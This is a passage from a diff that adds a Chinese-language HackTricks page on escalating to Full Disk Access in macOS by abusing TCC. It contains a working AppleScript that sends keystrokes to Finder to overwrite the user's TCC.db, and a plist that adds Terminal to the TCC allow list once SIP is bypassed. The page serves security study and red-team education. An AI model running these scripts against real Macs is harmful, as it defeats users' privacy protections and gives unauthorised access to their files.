+make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
+end if
+
+-- Enable the Folder Action and the script
+enable myFolderAction
+end tell
+EOD
+
+# File operations in the folder should trigger the Folder Action
+touch "$HOME/Desktop/file"
+rm "$HOME/Desktop/file"
+</code></pre>
+<h3 id="自动化-se--辅助功能-ktccserviceposteventktccserviceaccessibility-到-fda"><a class="header" href="#自动化-se--辅助功能-ktccserviceposteventktccserviceaccessibility-到-fda">自动化 (SE) + 辅助功能 (<strong><code>kTCCServicePostEvent</code>|</strong><code>kTCCServiceAccessibility</code><strong>)</strong> 到 FDA*</a></h3>
+<p>在 <strong><code>System Events</code></strong> 上的自动化 + 辅助功能 (<strong><code>kTCCServicePostEvent</code></strong>) 允许向进程发送 <strong>按键</strong>。通过这种方式，您可以滥用 Finder 来更改用户的 TCC.db 或为任意应用程序提供 FDA（尽管可能会提示输入密码）。</p>
+<p>Finder 覆盖用户 TCC.db 示例：</p>
+<pre><code class="language-applescript">-- store the TCC.db file to copy in /tmp
+osascript &lt;&lt;EOF
+tell application "System Events"
+-- Open Finder
+tell application "Finder" to activate
+
+-- Open the /tmp directory
+keystroke "g" using {command down, shift down}
+delay 1
+keystroke "/tmp"
+delay 1
+keystroke return
+delay 1
+
+-- Select and copy the file
+keystroke "TCC.db"
+delay 1
+keystroke "c" using {command down}
+delay 1
+
+-- Resolve $HOME environment variable
+set homePath to system attribute "HOME"
+
+-- Navigate to the Desktop directory under $HOME
+keystroke "g" using {command down, shift down}
+delay 1
+keystroke homePath &amp; "/Library/Application Support/com.apple.TCC"
+delay 1
+keystroke return
+delay 1
+
+-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
+keystroke "TCC.db"
+delay 1
+keystroke return
+delay 1
+key code 51 using {command down}
+delay 1
+
+-- Paste the file
+keystroke "v" using {command down}
+end tell
+EOF
+</code></pre>
+<h3 id="ktccserviceaccessibility-到-fda"><a class="header" href="#ktccserviceaccessibility-到-fda"><code>kTCCServiceAccessibility</code> 到 FDA*</a></h3>
+<p>查看此页面以获取一些 <a href="macos-tcc-payloads.html#accessibility"><strong>滥用可访问性权限的有效载荷</strong></a> 以提升到 FDA* 或运行键盘记录器，例如。</p>
+<h3 id="端点安全客户端到-fda"><a class="header" href="#端点安全客户端到-fda"><strong>端点安全客户端到 FDA</strong></a></h3>
+<p>如果你有 <strong><code>kTCCServiceEndpointSecurityClient</code></strong>，你就有 FDA。结束。</p>
+<h3 id="系统策略-sysadmin-文件到-fda"><a class="header" href="#系统策略-sysadmin-文件到-fda">系统策略 SysAdmin 文件到 FDA</a></h3>
+<p><strong><code>kTCCServiceSystemPolicySysAdminFiles</code></strong> 允许 <strong>更改</strong> 用户的 <strong><code>NFSHomeDirectory</code></strong> 属性，这会更改他的主文件夹，从而允许 <strong>绕过 TCC</strong>。</p>
+<h3 id="用户-tcc-数据库到-fda"><a class="header" href="#用户-tcc-数据库到-fda">用户 TCC 数据库到 FDA</a></h3>
+<p>获得 <strong>用户 TCC</strong> 数据库的 <strong>写权限</strong> 你 **不能** 授予自己 <strong><code>FDA</code></strong> 权限，只有系统数据库中的用户可以授予。</p>
+<p>但你可以 <strong>授予</strong> 自己 <strong><code>Finder 的自动化权限</code></strong>，并滥用之前的技术提升到 FDA*。</p>
+<h3 id="fda-到-tcc-权限"><a class="header" href="#fda-到-tcc-权限"><strong>FDA 到 TCC 权限</strong></a></h3>
+<p><strong>完全磁盘访问</strong> 在 TCC 中的名称是 <strong><code>kTCCServiceSystemPolicyAllFiles</code></strong></p>
+<p>我认为这不是真正的权限提升，但以防你觉得有用：如果你控制一个具有 FDA 的程序，你可以 <strong>修改用户的 TCC 数据库并授予自己任何访问权限</strong>。这可以作为一种持久性技术，以防你可能失去 FDA 权限。</p>
+<h3 id="sip-绕过到-tcc-绕过"><a class="header" href="#sip-绕过到-tcc-绕过"><strong>SIP 绕过到 TCC 绕过</strong></a></h3>
+<p>系统 <strong>TCC 数据库</strong> 受到 <strong>SIP</strong> 保护，这就是为什么只有具有 <strong>指示的权限</strong> 的进程才能修改它。因此，如果攻击者找到一个 <strong>SIP 绕过</strong> 通过一个 <strong>文件</strong>（能够修改受 SIP 限制的文件），他将能够：</p>
+<ul>
+<li><strong>移除</strong> TCC 数据库的保护，并授予自己所有 TCC 权限。他可以滥用这些文件中的任何一个，例如：</li>
+<li>TCC 系统数据库</li>
+<li>REG.db</li>
+<li>MDMOverrides.plist</li>
+</ul>
+<p>然而，还有另一种选择可以滥用这个 <strong>SIP 绕过来绕过 TCC</strong>，文件 <code>/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist</code> 是一个需要 TCC 例外的应用程序的允许列表。因此，如果攻击者可以 <strong>移除此文件的 SIP 保护</strong> 并添加自己的 <strong>应用程序</strong>，该应用程序将能够绕过 TCC。<br />
+例如添加终端：</p>
+<pre><code class="language-bash"># Get needed info
+codesign -d -r- /System/Applications/Utilities/Terminal.app
+</code></pre>
+<p>AllowApplicationsList.plist:</p>
+<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
+&lt;plist version="1.0"&gt;
+&lt;dict&gt;
+&lt;key&gt;Services&lt;/key&gt;
+&lt;dict&gt;
+&lt;key&gt;SystemPolicyAllFiles&lt;/key&gt;
+&lt;array&gt;
+&lt;dict&gt;
+&lt;key&gt;CodeRequirement&lt;/key&gt;
+&lt;string&gt;identifier &amp;quot;com.apple.Terminal&amp;quot; and anchor apple&lt;/string&gt;
+&lt;key&gt;IdentifierType&lt;/key&gt;
+&lt;string&gt;bundleID&lt;/string&gt;
+&lt;key&gt;Identifier&lt;/key&gt;
+&lt;string&gt;com.apple.Terminal&lt;/string&gt;
+&lt;/dict&gt;
+&lt;/array&gt;
+&lt;/dict&gt;
+&lt;/dict&gt;
+&lt;/plist&gt;
+</code></pre>
+<h3 id="tcc-绕过"><a class="header" href="#tcc-绕过">TCC 绕过</a></h3>
+<p>{% content-ref url="macos-tcc-bypasses/" %}
+<a href="macos-tcc-bypasses/">macos-tcc-bypasses</a>
+{% endcontent-ref %}</p>
+<h2 id="参考文献"><a class="header" href="#参考文献">参考文献</a></h2>
+<ul>
+<li><a href="https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive"><strong>https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive</strong></a></li>
+<li><a href="https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command"><strong>https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command</strong></a></li>
+<li><a href="https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/"><strong>https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/</strong></a></li>
+<li><a href="https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/"><strong>https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/</strong></a></li>
+</ul>
+<p>{% hint style="success" %}
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>telegram 群组</strong></a> 或 <strong>在</strong> <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a>** 上关注我们。**</li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 来分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../../../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-sip.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../../../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-apple-events.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../../../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-sip.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../../../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-apple-events.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../../../elasticlunr.min.js"></script>
+        <script src="../../../../mark.min.js"></script>
+        <script src="../../../../searcher.js"></script>
+
+        <script src="../../../../clipboard.min.js"></script>
+        <script src="../../../../highlight.js"></script>
+        <script src="../../../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
